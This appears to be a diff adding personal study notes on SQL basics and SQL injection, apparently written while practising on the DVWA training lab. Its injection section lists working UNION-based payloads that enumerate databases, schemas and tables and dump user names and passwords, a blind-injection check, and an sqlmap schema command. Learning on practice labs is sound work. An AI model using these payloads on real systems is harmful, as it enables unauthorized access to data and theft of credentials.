@@ -1,0 +1,33 @@
+Interaction with database
+Commands used to query in sql:
+
+CREATE
+SELECT (MOST IMPORTANT)
+UPDATE
+INSERT
+DELETE
+DROP
+
+SELECT elements FROM table WHERE condition
+Example:
+SELECT name, description, price FROM products WHERE price<599
+SELECT columnA FROM tableX WHERE columnE= 'employee' AND columnF=100;
+
+SQL injection:
+
+Use ' in userID to show a screen which shows an error to prove it is vulnerable to SQL injection.
+
+2' ORDER BY 3 #' : Error shows to say we have 2 columns
+2' UNION SELECT 1,2 #' : Prints out column wise every entry
+2' UNION SELECT database(), user() #' : Name of database, and name of users
+2' UNION SELECT schema_name, 2 FROM information_schema.schemata #' : Database info
+2' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'DATABASE NAME' #' :Info on users
+2' UNION SELECT CONCAT(user_id,'-',user,' ',password) FROM DATABASENAME.users #': List users name and id and password
+
+BLIND:
+
+1' AND database() = 'dvwa : Returns id with name proving database name is correct
+
+sqlmap(terminal):
+sqlmap -u "site" -p username --schema
+
